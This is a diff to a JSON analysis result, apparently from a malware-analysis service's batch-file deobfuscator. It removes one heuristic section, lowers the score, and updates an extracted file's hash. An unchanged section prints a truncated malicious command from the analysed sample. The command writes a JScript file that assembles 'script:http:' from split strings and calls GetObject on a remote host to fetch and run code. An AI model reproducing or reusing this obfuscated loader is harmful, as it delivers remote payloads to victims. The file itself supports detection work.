@@ -1,26 +1,8 @@
 {
   "extra": {
     "drop_file": false,
-    "score": 20,
+    "score": 10,
     "sections": [
-      {
-        "auto_collapse": false,
-        "body": "{\"Number of line after deobfuscation\": 6}",
-        "body_format": "KEY_VALUE",
-        "classification": "TLP:W",
-        "depth": 0,
-        "heuristic": {
-          "attack_ids": [],
-          "frequency": 1,
-          "heur_id": 6,
-          "score": 10,
-          "score_map": {},
-          "signatures": {}
-        },
-        "tags": {},
-        "title_text": "Complexe One-Liner",
-        "zeroize_on_tag_safe": false
-      },
       {
         "auto_collapse": false,
         "body": "[{\"Filename\": \"C:\\\\BT59TX5\\\\BT59TX5.jS\", \"Command [trun.]\": \"/p K1J0=\\\"var C66d=\\\"sc\\\"+\\\"r\\\" D66d=\\\"ip\\\"+\\\"t:h\\\" E66d=\\\"T\\\"+\\\"tP\\\"+\\\":\\\" GetObject(C66d+D66d+E66d+'//n7eo5j.real\"}]",
@@ -62,8 +44,8 @@
   "files": {
     "extracted": [
       {
-        "name": "bda4205533_deobfuscated.bat",
-        "sha256": "bda420553303de9d7a0cb8b9983b4066bbcd01829fbc6cda89510fee5742e1f8"
+        "name": "82db7bc229_deobfuscated.bat",
+        "sha256": "82db7bc2291f9cd1687b54d38d90ef8ebbcb77e643f1e7991db3254112e13369"
       },
       {
         "name": "C:\\BT59TX5\\BT59TX5.jS",
@@ -74,11 +56,6 @@
   },
   "results": {
     "heuristics": [
-      {
-        "attack_ids": [],
-        "heur_id": 6,
-        "signatures": []
-      },
       {
         "attack_ids": [],
         "heur_id": 8,
